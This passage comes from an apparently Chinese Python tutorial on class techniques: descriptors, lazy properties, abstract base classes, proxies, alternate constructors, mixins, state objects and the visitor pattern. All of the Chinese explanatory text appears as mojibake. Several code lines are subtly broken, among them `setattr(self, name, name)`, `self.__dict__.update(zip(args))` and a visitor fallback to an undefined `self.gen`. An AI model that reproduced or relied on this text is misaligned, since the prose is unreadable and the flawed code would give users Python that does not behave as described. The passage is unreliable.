else: return instance.__dict__[self.name] def __set__(self, instance, value): if not isinstance(value, int): raise TypeError('Expected an int') instance.__dict__[self.name] = value def __delete__(self, instance): del instance.__dict__[self.name] ä¸€ä¸ªæè¿°å™¨å°±æ˜¯ä¸€ä¸ªå®ç°äº†ä¸‰ä¸ªæ ¸å¿ƒçš„å±æ€§è®¿é—®æ“ä½œ (get, set, delete) çš„ç±»ï¼Œåˆ†åˆ« ä¸º __get__() ã€__set__() å’Œ __delete__() è¿™ä¸‰ä¸ªç‰¹æ®Šçš„æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•æ¥å—ä¸€ä¸ªå® ä¾‹ä½œä¸ºè¾“å…¥ï¼Œä¹‹åç›¸åº”çš„æ“ä½œå®ä¾‹åº•å±‚çš„å­—å…¸ ä¸ºäº†ä½¿ç”¨ä¸€ä¸ªæè¿°å™¨ï¼Œéœ€å°†è¿™ä¸ªæè¿°å™¨çš„å®ä¾‹ä½œä¸ºç±»å±æ€§æ”¾åˆ°ä¸€ä¸ªç±»çš„å®šä¹‰ä¸­ã€‚ä¾‹ å¦‚: class Point: x = Integer('x') y = Integer('y') def __init__(self, x, y): self.x = x self.y = y å½“ä½ è¿™æ ·åšåï¼Œæ‰€æœ‰å¯¹æè¿°å™¨å±æ€§ (æ¯”å¦‚ x æˆ– y) çš„è®¿é—®ä¼šè¢« __get__() ã€__set__() å’Œ __delete__() æ–¹æ³•æ•è·åˆ°ã€‚ä¾‹å¦‚: >>> p = Point(2, 3) >>> p.x # Calls Point.x.__get__(p,Point) 2 >>> p.y = 5 # Calls Point.y.__set__(p, 5) >>> p.x = 2.3 # Calls Point.x.__set__(p, 2.3) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"descrip.py\", line 12, in __set__ raise TypeError('Expected an int') TypeError: Expected an int >>> ä½œä¸ºè¾“å…¥ï¼Œæè¿°å™¨çš„æ¯ä¸€ä¸ªæ–¹æ³•ä¼šæ¥å—ä¸€ä¸ªæ“ä½œå®ä¾‹ã€‚ä¸ºäº†å®ç°è¯·æ±‚æ“ä½œï¼Œä¼šç›¸åº” çš„æ“ä½œå®ä¾‹åº•å±‚çš„å­—å…¸ (__dict__ å±æ€§)ã€‚æè¿°å™¨çš„ self.name å±æ€§å­˜å‚¨äº†åœ¨å®ä¾‹å­— å…¸ä¸­è¢«å®é™…ä½¿ç”¨åˆ°çš„ keyã€‚ æè¿°å™¨å¯å®ç°å¤§éƒ¨åˆ† Python ç±»ç‰¹æ€§ä¸­çš„åº•å±‚é­”æ³•ï¼ŒåŒ…æ‹¬ @classmethod ã€ @staticmethod ã€@property ï¼Œç”šè‡³æ˜¯ __slots__ ç‰¹æ€§ã€‚ é€šè¿‡å®šä¹‰ä¸€ä¸ªæè¿°å™¨ï¼Œä½ å¯ä»¥åœ¨åº•å±‚æ•è·æ ¸å¿ƒçš„å®ä¾‹æ“ä½œ (get, set, delete)ï¼Œå¹¶ä¸” å¯å®Œå…¨è‡ªå®šä¹‰å®ƒä»¬çš„è¡Œä¸ºã€‚è¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œæœ‰äº†å®ƒä½ å¯ä»¥å®ç°å¾ˆå¤šé«˜çº§åŠŸèƒ½ï¼Œå¹¶ ä¸”å®ƒä¹Ÿæ˜¯å¾ˆå¤šé«˜çº§åº“å’Œæ¡†æ¶ä¸­çš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ æè¿°å™¨çš„ä¸€ä¸ªæ¯”è¾ƒå›°æƒ‘çš„åœ°æ–¹æ˜¯å®ƒåªèƒ½åœ¨ç±»çº§åˆ«è¢«å®šä¹‰ï¼Œè€Œä¸èƒ½ä¸ºæ¯ä¸ªå®ä¾‹å•ç‹¬ å®šä¹‰ã€‚å› æ­¤ï¼Œä¸‹é¢çš„ä»£ç æ˜¯æ— æ³•å·¥ä½œçš„: # Does NOT work class Point: def __init__(self, x, y): self.x = Integer('x') # No! Must be a class variable self.y = Integer('y') self.x = x self.y = y __get__() çœ‹ä¸Šå»æœ‰ç‚¹å¤æ‚çš„åŸå› å½’ç»“äºå®ä¾‹å˜é‡å’Œç±»å˜é‡çš„ä¸åŒã€‚å¦‚æœä¸€ä¸ªæè¿° å™¨è¢«å½“åšä¸€ä¸ªç±»å˜é‡æ¥è®¿é—®ï¼Œé‚£ä¹ˆ instance å‚æ•°è¢«è®¾ç½®æˆ None ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæ ‡å‡†åš æ³•å°±æ˜¯ç®€å•çš„è¿”å›è¿™ä¸ªæè¿°å™¨æœ¬èº«å³å¯ (å°½ç®¡ä½ è¿˜å¯ä»¥æ·»åŠ å…¶ä»–çš„è‡ªå®šä¹‰æ“ä½œ): >>> p = Point(2,3) >>> p.x # Calls Point.x.__get__(p, Point) 2 >>> Point.x # Calls Point.x.__get__(None, Point) <__main__.Integer object at 0x100671890> >>> ä½¿ç”¨å»¶è¿Ÿè®¡ç®—å±æ€§ å°†ä¸€ä¸ªåªè¯»å±æ€§å®šä¹‰æˆä¸€ä¸ª propertyï¼Œå¹¶ä¸”åªåœ¨è®¿é—®çš„æ—¶å€™æ‰ä¼šè®¡ç®—ç»“æœã€‚ä½† æ˜¯ä¸€æ—¦è¢«è®¿é—®åï¼Œä½ å¸Œæœ›ç»“æœå€¼è¢«ç¼“å­˜èµ·æ¥ï¼Œä¸ç”¨æ¯æ¬¡éƒ½å»è®¡ç®—ã€‚ ä¸€èˆ¬è‡ªå·±å®ç°éƒ½æ˜¯ä½¿ç”¨çš„é¢„å®šä¹‰ç±»å˜é‡çš„å½¢å¼. ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»è£…é¥°å™¨çš„å½¢å¼å®ç°: class lazyproperty: def __init__(self, func): self.func = func def __get__(self, instance, cls): if instance is None: return self else: value = self.func(instance) # ä¸»è¦æ˜¯è¿™ä¸€å¥è®¾ç½®å€¼ setattr(instance, self.func.__name__, value) return value ä½¿ç”¨: import math class Circle: def __init__(self, radius): self.radius = radius @lazyproperty def area(self): print('Computing area') return math.pi * self.radius ** 2 @lazyproperty def perimeter(self): print('Computing perimeter') return 2 * math.pi * self.radius äº¤äº’ç¯å¢ƒä¸­æ¼”ç¤º: >>> c = Circle(4.0) >>> c.radius 4.0 >>> c.area Computing area 50.26548245743669 >>> c.area 50.26548245743669 >>> c.perimeter Computing perimeter 25.132741228718345 >>> c.perimeter 25.132741228718345 >>> å½“ä¸€ä¸ªæè¿°å™¨è¢«æ”¾å…¥ä¸€ä¸ªç±»çš„å®šä¹‰æ—¶ï¼Œ æ¯æ¬¡è®¿é—®å±æ€§æ—¶å®ƒçš„ __get__() ã€__set__() å’Œ __delete__() æ–¹æ³•å°±ä¼šè¢«è§¦å‘ã€‚ä¸è¿‡ï¼Œ å¦‚æœä¸€ä¸ªæè¿°å™¨ä»…ä»…åªå®šä¹‰äº†ä¸€ä¸ª __get__() æ–¹æ³•çš„è¯ï¼Œå®ƒæ¯”é€šå¸¸çš„å…·æœ‰æ›´å¼±çš„ç»‘å®šã€‚ ç‰¹åˆ«åœ°ï¼Œ åªæœ‰å½“è¢«è®¿é—®å±æ€§ä¸åœ¨å®ä¾‹åº•å±‚çš„å­—å…¸ä¸­æ—¶ __get__() æ–¹æ³•æ‰ä¼šè¢«è§¦å‘ã€‚ ç®€åŒ–æ•°æ®ç»“æ„çš„åˆå§‹åŒ– ä½ å†™äº†å¾ˆå¤šä»…ä»…ç”¨ä½œæ•°æ®ç»“æ„çš„ç±»ï¼Œä¸æƒ³å†™å¤ªå¤šçƒ¦äººçš„ __init__() å‡½æ•° å¯ä»¥åœ¨ä¸€ä¸ªåŸºç±»ä¸­å†™ä¸€ä¸ªå…¬ç”¨çš„ __init__() å‡½æ•°, ç„¶åä½¿ä½ çš„ç±»ç»§æ‰¿è‡ªè¿™ä¸ªåŸºç±». æ³¨æ„è®¾ç½®å€¼å¯ä»¥ä½¿ç”¨ setattræˆ–__dict__ [setattr(self, name, name) for name in args] self.__dict__.update(zip(args)) ä½¿ç”¨dictæ—¶, å°½ç®¡ä¹Ÿå¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯å½“å®šä¹‰å­ç±»çš„æ—¶å€™é—®é¢˜å°±æ¥äº†ã€‚å½“ä¸€ä¸ªå­ç±»å®šä¹‰äº† __slots__ æˆ–è€…é€šè¿‡ property(æˆ–æè¿°å™¨) æ¥åŒ…è£…æŸä¸ªå±æ€§ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®å®ä¾‹å­—å…¸å°± ä¸èµ·ä½œç”¨äº†ã€‚ è¿™ç§æ–¹æ³•å”¯ä¸€ä¸å¥½çš„åœ°æ–¹å°±æ˜¯å¯¹æŸäº› IDE è€Œè¨€ï¼Œåœ¨æ˜¾ç¤ºå¸®åŠ©å‡½æ•°æ—¶å¯èƒ½ä¸å¤ªå‹å¥½ã€‚ å®šä¹‰æ¥å£æˆ–è€…æŠ½è±¡åŸºç±» æƒ³å®šä¹‰ä¸€ä¸ªæ¥å£æˆ–æŠ½è±¡ç±»ï¼Œ å¹¶ä¸”é€šè¿‡æ‰§è¡Œç±»å‹æ£€æŸ¥æ¥ç¡®ä¿å­ç±»å®ç°äº†æŸäº›ç‰¹å®šçš„æ–¹æ³• ä½¿ç”¨ abc æ¨¡å—å¯ä»¥å¾ˆè½»æ¾çš„å®šä¹‰æŠ½è±¡åŸºç±»: from abc import ABCMeta, abstractmethod class IStream(metaclass=ABCMeta): @abstractmethod def read(self, maxbytes=-1): pass @abstractmethod def write(self, data): pass æŠ½è±¡ç±»çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒä¸èƒ½ç›´æ¥è¢«å®ä¾‹åŒ–ï¼Œæ¯”å¦‚ä½ æƒ³åƒä¸‹é¢è¿™æ ·åšæ˜¯ä¸è¡Œçš„: a = IStream() # TypeError: Can't instantiate abstract class # IStream with abstract methods read, write æŠ½è±¡ç±»çš„ç›®çš„å°±æ˜¯è®©åˆ«çš„ç±»ç»§æ‰¿å®ƒå¹¶å®ç°ç‰¹å®šçš„æŠ½è±¡æ–¹æ³• class SocketStream(IStream): def read(self, maxbytes=-1): pass def write(self, data): pass æŠ½è±¡åŸºç±»çš„ä¸€ä¸ªä¸»è¦ç”¨é€”æ˜¯åœ¨ä»£ç ä¸­æ£€æŸ¥æŸäº›ç±»æ˜¯å¦ä¸ºç‰¹å®šç±»å‹ï¼Œå®ç°äº†ç‰¹å®šæ¥å£: def serialize(obj, stream): if not isinstance(stream, IStream): raise TypeError('Expected an IStream') pass é™¤äº†ç»§æ‰¿è¿™ç§æ–¹å¼å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡æ³¨å†Œæ–¹å¼æ¥è®©æŸä¸ªç±»å®ç°æŠ½è±¡åŸºç±»: import io # Register the built-in I/O classes as supporting our interface IStream.register(io.IOBase) # Open a normal file and type check f = open('foo.txt') isinstance(f, IStream) # Returns True @abstractmethod è¿˜èƒ½æ³¨è§£é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•å’Œ properties ã€‚ä½ åªéœ€ä¿è¯è¿™ä¸ªæ³¨è§£ç´§é åœ¨å‡½æ•°å®šä¹‰å‰å³å¯: class A(metaclass=ABCMeta): @property @abstractmethod def name(self): pass @name.setter @abstractmethod def name(self, value): pass @classmethod @abstractmethod def method1(cls): pass @staticmethod @abstractmethod def method2(): pass æ ‡å‡†åº“ä¸­æœ‰å¾ˆå¤šç”¨åˆ°æŠ½è±¡åŸºç±»çš„åœ°æ–¹ã€‚collections æ¨¡å—å®šä¹‰äº†å¾ˆå¤šè·Ÿå®¹å™¨å’Œè¿­ ä»£å™¨ (åºåˆ—ã€æ˜ å°„ã€é›†åˆç­‰) æœ‰å…³çš„æŠ½è±¡åŸºç±»ã€‚numbers åº“å®šä¹‰äº†è·Ÿæ•°å­—å¯¹è±¡ (æ•´æ•°ã€æµ® ç‚¹æ•°ã€æœ‰ç†æ•°ç­‰) æœ‰å…³çš„åŸºç±»ã€‚io åº“å®šä¹‰äº†å¾ˆå¤šè·Ÿ I/O æ“ä½œç›¸å…³çš„åŸºç±»ã€‚ å¯ä»¥ä½¿ç”¨é¢„å®šä¹‰çš„æŠ½è±¡ç±»æ¥æ‰§è¡Œæ›´é€šç”¨çš„ç±»å‹æ£€æŸ¥: import collections # Check if x is a sequence if isinstance(x, collections.Sequence): ... # Check if x is iterable if isinstance(x, collections.Iterable): ... # Check if x has a size if isinstance(x, collections.Sized): ... # Check if x is a mapping if isinstance(x, collections.Mapping): ... å°½ç®¡ ABCs å¯ä»¥è®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„åšç±»å‹æ£€æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ä»£ç ä¸­æœ€å¥½ä¸è¦è¿‡å¤šçš„ ä½¿ç”¨å®ƒã€‚å› ä¸º Python çš„æœ¬è´¨æ˜¯ä¸€é—¨åŠ¨æ€ç¼–ç¨‹è¯­è¨€ï¼Œå…¶ç›®çš„å°±æ˜¯ç»™ä½ æ›´å¤šçµæ´»æ€§ï¼Œå¼ºåˆ¶ ç±»å‹æ£€æŸ¥æˆ–è®©ä½ ä»£ç å˜å¾—æ›´å¤æ‚ï¼Œè¿™æ ·åšæ— å¼‚äºèˆæœ¬æ±‚æœ«ã€‚ å®ç°æ•°æ®æ¨¡å‹çš„ç±»å‹çº¦æŸ å®šä¹‰æŸäº›åœ¨å±æ€§èµ‹å€¼ä¸Šé¢æœ‰é™åˆ¶çš„æ•°æ®ç»“æ„ã€‚ å®ç°è‡ªå®šä¹‰å®¹å™¨ æƒ³å®ç°ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»æ¥æ¨¡æ‹Ÿå†…ç½®çš„å®¹å™¨ç±»åŠŸèƒ½ï¼Œæ¯”å¦‚åˆ—è¡¨å’Œå­—å…¸ã€‚ä½†æ˜¯ä½ ä¸ç¡® å®šåˆ°åº•è¦å®ç°å“ªäº›æ–¹æ³• collections å®šä¹‰äº†å¾ˆå¤šæŠ½è±¡åŸºç±»ï¼Œå½“ä½ æƒ³è‡ªå®šä¹‰å®¹å™¨ç±»çš„æ—¶å€™å®ƒä»¬ä¼šéå¸¸æœ‰ç”¨ã€‚ æ¯”å¦‚ä½ æƒ³è®©ä½ çš„ç±»æ”¯æŒè¿­ä»£ï¼Œé‚£å°±è®©ä½ çš„ç±»ç»§æ‰¿ collections.Iterable. ä¸è¿‡ä½ éœ€è¦å®ç° collections.Iterable æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥é”™. ä½¿ç”¨ collections ä¸­çš„æŠ½è±¡åŸºç±»å¯ä»¥ç¡®ä¿ä½ è‡ªå®šä¹‰çš„å®¹å™¨å®ç°äº†æ‰€æœ‰å¿…è¦çš„æ–¹æ³•ã€‚ å¹¶ä¸”è¿˜èƒ½ç®€åŒ–ç±»å‹æ£€æŸ¥ã€‚ å±æ€§çš„ä»£ç†è®¿é—® æƒ³å°†æŸä¸ªå®ä¾‹çš„å±æ€§è®¿é—®ä»£ç†åˆ°å†…éƒ¨å¦ä¸€ä¸ªå®ä¾‹ä¸­å»ï¼Œç›®çš„å¯èƒ½æ˜¯ä½œä¸ºç»§æ‰¿çš„ ä¸€ä¸ªæ›¿ä»£æ–¹æ³•æˆ–è€…å®ç°ä»£ç†æ¨¡å¼ã€‚ ç®€å•æ¥è¯´ï¼Œä»£ç†æ˜¯ä¸€ç§ç¼–ç¨‹æ¨¡å¼ï¼Œå®ƒå°†æŸä¸ªæ“ä½œè½¬ç§»ç»™å¦å¤–ä¸€ä¸ªå¯¹è±¡æ¥å®ç°ã€‚æœ€ç®€ å•çš„å½¢å¼å¯èƒ½æ˜¯åƒä¸‹é¢è¿™æ ·: class A: def spam(self, x): pass def foo(self): pass class B1: \"\"\" ç®€å•çš„ä»£ç†\"\"\" def __init__(self): self._a = A() def spam(self, x): # Delegate to the internal self._a instance return self._a.spam(x) def foo(self): # Delegate to the internal self._a instance return self._a.foo() def bar(self): pass å¦‚æœä»…ä»…å°±ä¸¤ä¸ªæ–¹æ³•éœ€è¦ä»£ç†ï¼Œé‚£ä¹ˆåƒè¿™æ ·å†™å°±è¶³å¤Ÿäº†ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœ‰å¤§é‡çš„æ–¹æ³• éœ€è¦ä»£ç†ï¼Œé‚£ä¹ˆä½¿ç”¨ __getattr__() æ–¹æ³•æˆ–è®¸æˆ–æ›´å¥½äº›: def __getattr__(self, name): \"\"\" è¿™ä¸ªæ–¹æ³•åœ¨è®¿é—®çš„ attribute ä¸å­˜åœ¨çš„æ—¶å€™è¢«è°ƒç”¨ the __getattr__() method is actually a fallback method that only gets called when an attribute is not found\"\"\" return getattr(self._a, name) __getattr__ æ–¹æ³•æ˜¯åœ¨è®¿é—® attribute ä¸å­˜åœ¨çš„æ—¶å€™è¢«è°ƒç”¨ å½“å®ç°ä»£ç†æ¨¡å¼æ—¶ï¼Œè¿˜æœ‰äº›ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ__getattr__() å®é™…æ˜¯ä¸€ä¸ªåå¤‡ æ–¹æ³•ï¼Œåªæœ‰åœ¨å±æ€§ä¸å­˜åœ¨æ—¶æ‰ä¼šè°ƒç”¨ã€‚å› æ­¤ï¼Œå¦‚æœä»£ç†ç±»å®ä¾‹æœ¬èº«æœ‰è¿™ä¸ªå±æ€§çš„è¯ï¼Œé‚£ ä¹ˆä¸ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•çš„ã€‚å¦å¤–ï¼Œ__setattr__() å’Œ __delattr__() éœ€è¦é¢å¤–çš„é­”æ³•æ¥ åŒºåˆ†ä»£ç†å®ä¾‹å’Œè¢«ä»£ç†å®ä¾‹ _obj çš„å±æ€§ã€‚ä¸€ä¸ªé€šå¸¸çš„çº¦å®šæ˜¯åªä»£ç†é‚£äº›ä¸ä»¥ä¸‹åˆ’çº¿ _ å¼€å¤´çš„å±æ€§ (ä»£ç†ç±»åªæš´éœ²è¢«ä»£ç†ç±»çš„å…¬å…±å±æ€§)ã€‚ è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ__getattr__() å¯¹äºå¤§éƒ¨åˆ†ä»¥åŒä¸‹åˆ’çº¿ (__) å¼€å§‹å’Œç»“å°¾ çš„å±æ€§å¹¶ä¸é€‚ç”¨ åœ¨ç±»ä¸­å®šä¹‰å¤šä¸ªæ„é€ å™¨ æƒ³å®ç°ä¸€ä¸ªç±»ï¼Œé™¤äº†ä½¿ç”¨ __init__() æ–¹æ³•å¤–ï¼Œè¿˜æœ‰å…¶ä»–æ–¹å¼å¯ä»¥åˆå§‹åŒ–å®ƒ ä¸ºäº†å®ç°å¤šä¸ªæ„é€ å™¨ï¼Œä½ éœ€è¦ä½¿ç”¨åˆ°ç±»æ–¹æ³•: import time class Date: \"\"\" æ–¹æ³•ä¸€ï¼šä½¿ç”¨ç±»æ–¹æ³•\"\"\" # Primary constructor def __init__(self, year, month, day): self.year = year self.month = month self.day = day # Alternate constructor @classmethod def today(cls): t = time.localtime() return cls(t.tm_year, t.tm_mon, t.tm_mday) ç›´æ¥è°ƒç”¨ç±»æ–¹æ³•å³å¯: a = Date(2012, 12, 21) # Primary b = Date.today() # Alternate åˆ›å»ºä¸è°ƒç”¨ init æ–¹æ³•çš„å®ä¾‹ æƒ³åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œä½†æ˜¯å¸Œæœ›ç»•è¿‡æ‰§è¡Œ __init__() æ–¹æ³• å¯ä»¥é€šè¿‡ __new__() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæœªåˆå§‹åŒ–çš„å®ä¾‹. ä¸è°ƒç”¨ __init__() æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹, ä½¿ç”¨ setattr è®¾ç½®å€¼: >>> d = Date.__new__(Date) >>> d <__main__.Date object at 0x1006716d0> >>> d.year >>> setattr(d, 'year', 2023) åˆ©ç”¨ Mixins æ‰©å±•ç±»åŠŸèƒ½ æœ‰å¾ˆå¤šæœ‰ç”¨çš„æ–¹æ³•ï¼Œæƒ³ä½¿ç”¨å®ƒä»¬æ¥æ‰©å±•å…¶ä»–ç±»çš„åŠŸèƒ½ã€‚ä½†æ˜¯è¿™äº›ç±»å¹¶æ²¡æœ‰ä»»ä½•ç»§ æ‰¿çš„å…³ç³»ã€‚å› æ­¤ä½ ä¸èƒ½ç®€å•çš„å°†è¿™äº›æ–¹æ³•æ”¾å…¥ä¸€ä¸ªåŸºç±»ï¼Œç„¶åè¢«å…¶ä»–ç±»ç»§æ‰¿ã€‚ å®šä¹‰ä½¿ç”¨äº†__slots__=(), è¡¨ç¤ºå®ä¾‹å­—å…¸ä¸å­˜å‚¨ä¿¡æ¯: class SetOnceMappingMixin: ''' Only allow a key to be set once. ''' __slots__ = () def __setitem__(self, key, value): if key in self: raise KeyError(str(key) + ' already set') return super().__setitem__(key, value) é€šå¸¸å½“ä½ æƒ³è‡ªå®šä¹‰ç±»çš„æ—¶å€™ä¼šç¢°ä¸Šè¿™äº›é—®é¢˜ã€‚å¯èƒ½æ˜¯æŸä¸ªåº“æä¾›äº†ä¸€äº›åŸºç¡€ç±»ï¼Œä½  å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ„é€ ä½ è‡ªå·±çš„ç±»ã€‚ å‡è®¾ä½ æƒ³æ‰©å±•æ˜ å°„å¯¹è±¡ï¼Œç»™å®ƒä»¬æ·»åŠ æ—¥å¿—ã€å”¯ä¸€æ€§è®¾ç½®ã€ç±»å‹æ£€æŸ¥ç­‰ç­‰åŠŸèƒ½ã€‚ å®ç°çŠ¶æ€å¯¹è±¡æˆ–è€…çŠ¶æ€æœº æƒ³å®ç°ä¸€ä¸ªçŠ¶æ€æœºæˆ–è€…æ˜¯åœ¨ä¸åŒçŠ¶æ€ä¸‹æ‰§è¡Œæ“ä½œçš„å¯¹è±¡ï¼Œä½†æ˜¯åˆä¸æƒ³åœ¨ä»£ç ä¸­ å‡ºç°å¤ªå¤šçš„æ¡ä»¶åˆ¤æ–­è¯­å¥ã€‚ ä¸€ä¸ªæ›´å¥½çš„åŠæ³•æ˜¯ä¸ºæ¯ä¸ªçŠ¶æ€å®šä¹‰ä¸€ä¸ªå¯¹è±¡: class Connection1: \"\"\" æ–°æ–¹æ¡ˆâ€”â€”å¯¹æ¯ä¸ªçŠ¶æ€å®šä¹‰ä¸€ä¸ªç±»\"\"\" def __init__(self): self.new_state(ClosedConnectionState) def new_state(self, newstate): self._state = newstate # Delegate to the state class def read(self): return self._state.read(self) def write(self, data): return self._state.write(self, data) å¦‚æœä»£ç ä¸­å‡ºç°å¤ªå¤šçš„æ¡ä»¶åˆ¤æ–­è¯­å¥çš„è¯ï¼Œä»£ç å°±ä¼šå˜å¾—éš¾ä»¥ç»´æŠ¤å’Œé˜…è¯»ã€‚è¿™é‡Œçš„ è§£å†³æ–¹æ¡ˆæ˜¯å°†æ¯ä¸ªçŠ¶æ€æŠ½å–å‡ºæ¥å®šä¹‰æˆä¸€ä¸ªç±»ã€‚ è¿™é‡Œçœ‹ä¸Šå»æœ‰ç‚¹å¥‡æ€ªï¼Œæ¯ä¸ªçŠ¶æ€å¯¹è±¡éƒ½åªæœ‰é™æ€æ–¹æ³•ï¼Œå¹¶æ²¡æœ‰å­˜å‚¨ä»»ä½•çš„å®ä¾‹ å±æ€§æ•°æ®ã€‚å®é™…ä¸Šï¼Œæ‰€æœ‰çŠ¶æ€ä¿¡æ¯éƒ½åªå­˜å‚¨åœ¨ Connection å®ä¾‹ä¸­ã€‚åœ¨åŸºç±»ä¸­å®šä¹‰çš„ NotImplementedError æ˜¯ä¸ºäº†ç¡®ä¿å­ç±»å®ç°äº†ç›¸åº”çš„æ–¹æ³•ã€‚ ps: è®¾è®¡æ¨¡å¼ä¸­æœ‰ä¸€ç§æ¨¡å¼å«çŠ¶æ€æ¨¡å¼, ä¸æ­¤ç±»ä¼¼. é€šè¿‡å­—ç¬¦ä¸²è°ƒç”¨å¯¹è±¡æ–¹æ³• æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„æ–¹æ³•åç§°ï¼Œæƒ³é€šè¿‡å®ƒè°ƒç”¨æŸä¸ªå¯¹è±¡çš„å¯¹åº”æ–¹æ³•ã€‚ æœ€ç®€å•çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ getattr() å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ operator.methodcaller() å½“ä½ éœ€è¦é€šè¿‡ç›¸åŒçš„å‚æ•°å¤šæ¬¡è°ƒç”¨æŸä¸ªæ–¹æ³•æ—¶ï¼Œä½¿ç”¨ operator.methodcaller å°± å¾ˆæ–¹ä¾¿äº†ã€‚æ¯”å¦‚ä½ éœ€è¦æ’åºä¸€ç³»åˆ—çš„ç‚¹ï¼Œå°±å¯ä»¥è¿™æ ·åš: points = [ Point(1, 2), Point(3, 0), Point(10, -3), Point(-5, -7), Point(-1, 8), Point(3, 2) ] # Sort by distance from origin (0, 0) points.sort(key=operator.methodcaller('distance', 0, 0)) è°ƒç”¨ä¸€ä¸ªæ–¹æ³•å®é™…ä¸Šæ˜¯ä¸¤éƒ¨ç‹¬ç«‹æ“ä½œï¼Œç¬¬ä¸€æ­¥æ˜¯æŸ¥æ‰¾å±æ€§ï¼Œç¬¬äºŒæ­¥æ˜¯å‡½æ•°è°ƒç”¨ã€‚å›  æ­¤ï¼Œä¸ºäº†è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œä½ å¯ä»¥é¦–å…ˆé€šè¿‡ getattr() æ¥æŸ¥æ‰¾åˆ°è¿™ä¸ªå±æ€§ï¼Œç„¶åå†å»ä»¥ å‡½æ•°æ–¹å¼è°ƒç”¨å®ƒå³å¯ã€‚ operator.methodcaller() åˆ›å»ºä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå¹¶åŒæ—¶æä¾›æ‰€æœ‰å¿…è¦å‚æ•°ï¼Œç„¶ åè°ƒç”¨çš„æ—¶å€™åªéœ€è¦å°†å®ä¾‹å¯¹è±¡ä¼ é€’ç»™å®ƒå³å¯ å®ç°è®¿é—®è€…æ¨¡å¼ ä½ è¦å¤„ç†ç”±å¤§é‡ä¸åŒç±»å‹çš„å¯¹è±¡ç»„æˆçš„å¤æ‚æ•°æ®ç»“æ„ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½éœ€è¦éœ€è¦è¿› è¡Œä¸åŒçš„å¤„ç†ã€‚æ¯”å¦‚ï¼Œéå†ä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œç„¶åæ ¹æ®æ¯ä¸ªèŠ‚ç‚¹çš„ç›¸åº”çŠ¶æ€æ‰§è¡Œä¸åŒçš„æ“ ä½œã€‚ è¿™é‡Œé‡åˆ°çš„é—®é¢˜åœ¨ç¼–ç¨‹é¢†åŸŸä¸­æ˜¯å¾ˆæ™®éçš„ï¼Œæœ‰æ—¶å€™ä¼šæ„å»ºä¸€ä¸ªç”±å¤§é‡ä¸åŒå¯¹è±¡ç»„ æˆçš„æ•°æ®ç»“æ„ã€‚ ä½¿ç”¨è®¿é—®è€…æ¨¡å¼: class NodeVisitor: def visit(self, node): methname = 'visit_' + type(node).__name__ meth = getattr(self, methname, None) if meth is None: meth = self.gen return meth(node) class Evaluator(NodeVisitor): def visit_Number(self, node): return node.value def visit_Add(self, node): return self.visit(node.left) + self.visit(node.right) def visit_Sub(self, node): return self.visit(node.left) - self.visit(node.right) def visit_Mul(self, node): return self.visit(node.left) * self.visit(node.right) def visit_Div(self, node): return self.visit(node.left) / self.visit(node.right) def visit_Negate(self, node): return -node.operand åˆšå¼€å§‹çš„æ—¶å€™ä½ å¯èƒ½ä¼šå†™å¤§é‡çš„ if/else è¯­å¥æ¥å®ç°ï¼Œè¿™é‡Œè®¿é—®è€…æ¨¡å¼çš„å¥½å¤„å°±æ˜¯ é€šè¿‡ getattr() æ¥è·å–ç›¸åº”çš„æ–¹æ³• è¿˜æœ‰ä¸€ç‚¹éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œè¿™ç§æŠ€æœ¯ä¹Ÿæ˜¯å®ç°å…¶ä»–è¯­è¨€ä¸­ switch æˆ– case è¯­å¥çš„æ–¹å¼ã€‚ æ¯”å¦‚ï¼Œå¦‚æœä½ æ­£åœ¨å†™ä¸€ä¸ª HTTP æ¡†æ¶ï¼Œä½ å¯èƒ½ä¼šå†™è¿™æ ·ä¸€ä¸ªè¯·æ±‚åˆ†å‘çš„æ§åˆ¶å™¨: class HTTPHandler: def handle(self, request): methname = 'do_' + request.request_method getattr(self, methname)(request) def do_GET(self, request): pass def do_POST(self, request): pass def do_HEAD(self, request): pass ä¸ç”¨é€’å½’å®ç°è®¿é—®è€…æ¨¡å¼ è®¿é—®è€…æ¨¡å¼ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯å®ƒä¸¥é‡ä¾èµ–é€’å½’ï¼Œå¦‚æœæ•°æ®ç»“æ„åµŒå¥—å±‚æ¬¡å¤ªæ·±å¯èƒ½ä¼šæœ‰ é—®é¢˜ï¼Œæœ‰æ—¶å€™ä¼šè¶…è¿‡ Python çš„é€’å½’æ·±åº¦é™åˆ¶ (å‚è€ƒ sys.getrecursionlimit() )ã€‚ ä½ ä½¿ç”¨è®¿é—®è€…æ¨¡å¼éå†ä¸€ä¸ªå¾ˆæ·±çš„åµŒå¥—æ 